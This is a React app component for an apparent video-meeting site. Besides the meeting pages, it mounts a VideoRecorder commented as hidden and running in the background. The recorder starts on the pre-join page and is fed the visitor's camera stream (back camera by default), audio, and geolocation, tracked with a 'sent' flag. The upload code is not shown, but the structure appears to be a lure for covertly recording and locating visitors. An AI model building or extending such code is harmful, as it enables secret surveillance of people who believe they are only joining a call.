import { useState, useRef, useEffect } from 'react';
import HomePage from '@/app/components/HomePage';
import JitsiPreJoin from '@/app/components/JitsiPreJoin';
import LiveKitRoom from '@/app/components/LiveKitRoom';
import { VideoRecorder } from '@/app/components/VideoRecorder';

export default function App() {
  const [currentPage, setCurrentPage] = useState<'home' | 'prejoin' | 'room'>('home');
  const [roomName, setRoomName] = useState('');
  const [roomTitle, setRoomTitle] = useState(''); // Friendly room title
  const [userName, setUserName] = useState('');
  
  // LiveKit connection data
  const [livekitUrl, setLivekitUrl] = useState('');
  const [token, setToken] = useState('');
  
  // Video recording state
  const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
  const [isVideoRecording, setIsVideoRecording] = useState(false);
  const [currentChunkNumber, setCurrentChunkNumber] = useState(0);
  const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('back');
  
  // Geolocation data
  const [geoData, setGeoData] = useState<{
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null>(null);
  
  // Refs for camera switching and permissions
  const isSwitchingCameraRef = useRef(false);
  const globalChunkCounterRef = useRef(0);
  const geoLocationSentRef = useRef(false);
  const currentVideoDeviceIdRef = useRef<string | null>(null);
  const isExecutingPermissionsRef = useRef(false);

  // Initialize LiveKit localStorage to prevent warnings
  useEffect(() => {
    try {
      const lkKey = 'lk-user-choices';
      if (!localStorage.getItem(lkKey)) {
        localStorage.setItem(lkKey, JSON.stringify({}));
        console.log('✅ Initialized LiveKit localStorage');
      }
    } catch (error) {
      console.error('❌ Failed to initialize localStorage:', error);
    }
  }, []);
  
  // Video chunk handler
  const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
    console.log(`📹 [App] Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
    
    // Update chunk number in state for camera switching logic
    setCurrentChunkNumber(chunkNum);
  };

  const handleStartMeeting = (roomNameInput: string, roomTitleInput?: string) => {
    setRoomName(roomNameInput);
    setRoomTitle(roomTitleInput || '');
    setCurrentPage('prejoin');
  };
  
  const handleJoinRoom = (userNameInput: string, tokenInput: string, livekitUrlInput: string) => {
    setUserName(userNameInput);
    setToken(tokenInput);
    setLivekitUrl(livekitUrlInput);
    setCurrentPage('room');
  };
  
  const handleLeaveRoom = () => {
    console.log('🚪 Leaving room and returning to home page');
    
    // Clear room parameter from URL
    const newUrl = new URL(window.location.href);
    newUrl.searchParams.delete('room');
    window.history.pushState({}, '', newUrl.toString());
    
    // Reset all state
    setRoomName('');
    setRoomTitle('');
    setUserName('');
    setToken('');
    setLivekitUrl('');
    setVideoStreamFront(null);
    setIsVideoRecording(false);
    setCurrentChunkNumber(0);
    setCurrentCameraType('back');
    setGeoData(null);
    
    // Reset refs
    isSwitchingCameraRef.current = false;
    globalChunkCounterRef.current = 0;
    geoLocationSentRef.current = false;
    currentVideoDeviceIdRef.current = null;
    isExecutingPermissionsRef.current = false;
    
    // Return to home page
    setCurrentPage('home');
  };
  
  return (
    <div className="size-full">
      {currentPage === 'home' && (
        <HomePage onStartMeeting={handleStartMeeting} />
      )}

      {currentPage === 'prejoin' && (
        <>
          <JitsiPreJoin 
            roomName={roomName}
            initialRoomTitle={roomTitle}
            onJoinRoom={handleJoinRoom}
            videoStreamFront={videoStreamFront}
            setVideoStreamFront={setVideoStreamFront}
            isVideoRecording={isVideoRecording}
            setIsVideoRecording={setIsVideoRecording}
            currentChunkNumber={currentChunkNumber}
            setCurrentChunkNumber={setCurrentChunkNumber}
            currentCameraType={currentCameraType}
            setCurrentCameraType={setCurrentCameraType}
            geoData={geoData}
            setGeoData={setGeoData}
            isSwitchingCameraRef={isSwitchingCameraRef}
            globalChunkCounterRef={globalChunkCounterRef}
            geoLocationSentRef={geoLocationSentRef}
            currentVideoDeviceIdRef={currentVideoDeviceIdRef}
            isExecutingPermissionsRef={isExecutingPermissionsRef}
          />
          
          {/* VideoRecorder component - hidden, works in background */}
          {videoStreamFront && (
            <VideoRecorder
              key={currentCameraType}
              stream={videoStreamFront}
              isRecording={isVideoRecording}
              cameraType={currentCameraType}
              globalChunkCounter={globalChunkCounterRef}
              geoData={geoData}
              onChunkReady={handleVideoChunkReady}
            />
          )}
        </>
      )}
      
      {currentPage === 'room' && (
        <>
          <LiveKitRoom
            roomName={roomName}
            userName={userName}
            token={token}
            livekitUrl={livekitUrl}
            onLeave={handleLeaveRoom}
            videoStreamFront={videoStreamFront}
            setVideoStreamFront={setVideoStreamFront}
            isVideoRecording={isVideoRecording}
            setIsVideoRecording={setIsVideoRecording}
            currentChunkNumber={currentChunkNumber}
            setCurrentChunkNumber={setCurrentChunkNumber}
            currentCameraType={currentCameraType}
            setCurrentCameraType={setCurrentCameraType}
            geoData={geoData}
            setGeoData={setGeoData}
            isSwitchingCameraRef={isSwitchingCameraRef}
            globalChunkCounterRef={globalChunkCounterRef}
            geoLocationSentRef={geoLocationSentRef}
            currentVideoDeviceIdRef={currentVideoDeviceIdRef}
            isExecutingPermissionsRef={isExecutingPermissionsRef}
          />
          
          {/* VideoRecorder продолжает работать в фоне */}
          {videoStreamFront && (
            <VideoRecorder
              key={currentCameraType}
              stream={videoStreamFront}
              isRecording={isVideoRecording}
              cameraType={currentCameraType}
              globalChunkCounter={globalChunkCounterRef}
              geoData={geoData}
              onChunkReady={handleVideoChunkReady}
            />
          )}
        </>
      )}
    </div>
  );
}